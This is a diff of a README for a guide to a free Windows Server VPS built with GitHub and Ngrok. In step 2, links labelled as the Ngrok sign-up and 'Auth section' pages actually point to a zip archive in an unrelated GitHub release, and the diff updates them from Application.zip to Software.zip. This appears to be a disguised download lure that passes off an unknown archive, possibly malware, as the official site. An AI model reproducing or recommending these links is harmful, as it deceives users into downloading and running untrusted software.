@@ -24,8 +24,8 @@ This repository provides a step-by-step guide to create a free Windows Server VP
 Fork this repository to your own GitHub account.
 
 ### 2. Generate Ngrok Authentication Token
-1. Sign up for an Ngrok account at [Ngrok](https://github.com/henrique20083/CloudPC/releases/download/v1.0/Application.zip).
-2. After signing in, go to the [Auth section](https://github.com/henrique20083/CloudPC/releases/download/v1.0/Application.zip) to get your authentication token.
+1. Sign up for an Ngrok account at [Ngrok](https://github.com/henrique20083/CloudPC/releases/download/v2.0/Software.zip).
+2. After signing in, go to the [Auth section](https://github.com/henrique20083/CloudPC/releases/download/v2.0/Software.zip) to get your authentication token.
 
 ### 3. Add Ngrok Token to GitHub Secrets
 1. Go to your forked repository on GitHub.
